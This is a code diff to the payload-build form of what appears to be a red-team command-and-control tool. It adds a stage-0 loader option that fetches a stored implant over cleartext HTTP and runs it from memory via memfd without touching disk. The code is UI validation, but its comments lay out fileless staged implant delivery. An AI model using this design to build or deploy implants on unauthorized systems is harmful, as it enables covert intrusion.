@@ -100,6 +100,12 @@ export function PayloadBuildView({
   // render, no job). One toggle, one mental model -- this is where
   // artifacts are made.
   const [artifact, setArtifact] = useState<'implant' | 'webshell'>('implant')
+  // The implant pipeline's own tier pick: the full implant, or the stage-0
+  // loader that fetches and runs a stored implant from memory (the sealed
+  // stage rides the loader's per-build key; the Launchers tab delivers the
+  // loader with the same one-liner families).
+  const [tier, setTier] = useState<'implant' | 'loader'>('implant')
+  const [stagePayloadId, setStagePayloadId] = useState('')
   const [targetOs, setTargetOs] = useState('linux')
   const [targetArch, setTargetArch] = useState('amd64')
   const [listenerId, setListenerId] = useState('')
@@ -151,6 +157,28 @@ export function PayloadBuildView({
   useEffect(() => {
     if (pollOnly && mode === 'stream') setMode('poll')
   }, [pollOnly, mode])
+
+  // The loader tier's client-side shape of the server's gates: a Linux
+  // memfd artifact on the two arches its crate compiles, dialing a
+  // cleartext http front by literal IPv4 (no TLS, no resolver in the
+  // tier). The server refuses anything else with the same rules; these
+  // keep the form from offering a build it would reject.
+  const loaderTier = tier === 'loader'
+  useEffect(() => {
+    if (loaderTier && targetOs !== 'linux') setTargetOs('linux')
+  }, [loaderTier, targetOs])
+  useEffect(() => {
+    if (loaderTier && !['amd64', 'arm64'].includes(targetArch)) setTargetArch('amd64')
+  }, [loaderTier, targetArch])
+  // The loader's dial test: the picked front must be an http listener whose
+  // public endpoint is a bare literal IPv4 (a port allowed), because the
+  // loader bakes the four address bytes as constants.
+  const loaderFrontOk = !loaderTier
+    || (selectedListener?.transport === 'http'
+      && /^\d+\.\d+\.\d+\.\d+(:\d+)?$/.test(selectedListener?.publicEndpoint.trim() ?? ''))
+  // The stage picker's offer: this engagement's stored implants (a loader
+  // delivers the implant tier, never another loader).
+  const stageable = library.filter((p) => !p.stagePayloadId && p.kind !== 'loader')
 
   const num = (value: string): number | null => {
     const trimmed = value.trim()
@@ -337,6 +365,14 @@ export function PayloadBuildView({
       setError('Pick a listener (create one in the listeners panel first).')
       return
     }
+    if (loaderTier && !loaderFrontOk) {
+      setError('The stage-0 loader dials a cleartext http front by literal IPv4 -- pick an http listener whose public endpoint is an IPv4 address.')
+      return
+    }
+    if (loaderTier && !stagePayloadId) {
+      setError('Pick the stored implant the loader delivers (stage).')
+      return
+    }
     setSubmitting(true)
     try {
       await enqueueBuildJob(engagementId, {
@@ -369,6 +405,10 @@ export function PayloadBuildView({
         killDate: killDate ? new Date(killDate).toISOString() : null,
         tokenMaxUses: num(tokenMaxUses),
         tokenLifetimeSeconds: num(tokenHours) !== null ? num(tokenHours)! * 3600 : null,
+        // The tier pick: the loader names its stage; the implant rides the
+        // default.
+        kind: loaderTier ? 'loader' : null,
+        stagePayloadId: loaderTier ? stagePayloadId : null,
         // Format rides empty: every spelling is the same native binary over
         // the Rust unit, and the disk-or-memory choice is the launcher
         // step's (the Launchers tab offers both families for every payload).
@@ -426,6 +466,35 @@ export function PayloadBuildView({
         <fieldset>
           <legend>Target</legend>
           <label>
+            Tier
+            <select
+              value={tier}
+              onChange={(e) => setTier(e.target.value as 'implant' | 'loader')}
+              title="Which tier of the delivery stack this build produces. Implant: the full product -- every baked contact, the verb set, the sealed envelope. Stage-0 loader: a ~25 KB no-libc dialer that fetches the stage you pick over cleartext http, authenticates it under the build's per-artifact AES-GCM key (nothing executes that does not open under that key), and runs it from a memfd -- the stage never lands on disk. The loader's baked credential spends one use per execution (each run fetches the stage once), so budget the token accordingly."
+            >
+              <option value="implant">Implant (full product)</option>
+              <option value="loader">Stage-0 loader (sealed stage, memfd)</option>
+            </select>
+          </label>
+          {loaderTier && (
+            <label>
+              Stage (the implant it delivers)
+              <select
+                value={stagePayloadId}
+                onChange={(e) => setStagePayloadId(e.target.value)}
+                title="The stored implant this loader fetches and runs. The fetch serves the stage sealed under the loader's own baked key; deleting either artifact ends the delivery."
+              >
+                <option value="" disabled>-- pick the stage --</option>
+                {stageable.map((p) => (
+                  <option key={p.artifactId} value={p.artifactId}>
+                    {p.fingerprint.slice(0, 12)} · {p.target ?? 'unknown-target'} ·{' '}
+                    {p.builtAt.slice(0, 10)}
+                  </option>
+                ))}
+              </select>
+            </label>
+          )}
+          <label>
             Listener (enroll + contact)
             <select
               value={listenerId}
@@ -446,6 +515,13 @@ export function PayloadBuildView({
               )}
             </select>
           </label>
+          {loaderTier && !loaderFrontOk && (
+            <p className="muted" style={{ color: '#e6a23c' }}>
+              The stage-0 loader dials a cleartext http front by literal IPv4 (it carries no TLS
+              and no resolver) -- pick an http listener whose public endpoint is an IPv4
+              address.
+            </p>
+          )}
           {carriers.length > 0 && (
             <label>
               Contact carrier
@@ -476,7 +552,9 @@ export function PayloadBuildView({
               }}
             >
               <option value="linux">Linux</option>
-              <option value="windows">Windows</option>
+              <option value="windows" disabled={loaderTier}>
+                Windows
+              </option>
             </select>
           </label>
           <label>
@@ -493,6 +571,25 @@ export function PayloadBuildView({
             </select>
           </label>
         </fieldset>
+        {loaderTier ? (
+          <fieldset>
+            <legend>Credential</legend>
+            <label>
+              Max uses
+              <input
+                value={tokenMaxUses}
+                onChange={(e) => setTokenMaxUses(e.target.value)}
+                title="The loader's baked credential spends one use per execution (each run fetches the sealed stage once), not per host -- a loader meant to survive reboots needs a budget or 0 (unlimited) inside its kill window. Default 1: a single-shot delivery."
+              />
+              <span className="field-help">0 = unlimited</span>
+            </label>
+            <p className="muted" style={{ gridColumn: '1 / -1', margin: 0 }}>
+              The loader bakes no contact profile — its only knobs are the stage it delivers and
+              the credential that gates the fetch. The implant it runs carries its own baked
+              profile from its build.
+            </p>
+          </fieldset>
+        ) : (
         <fieldset>
           <legend>Beacon profile</legend>
           <label>
@@ -540,6 +637,7 @@ export function PayloadBuildView({
             specifics.
           </p>
         </fieldset>
+        )}
         <details className="build-advanced">
           <summary>Advanced — wire shape and credential timing</summary>
           <div className="grid">
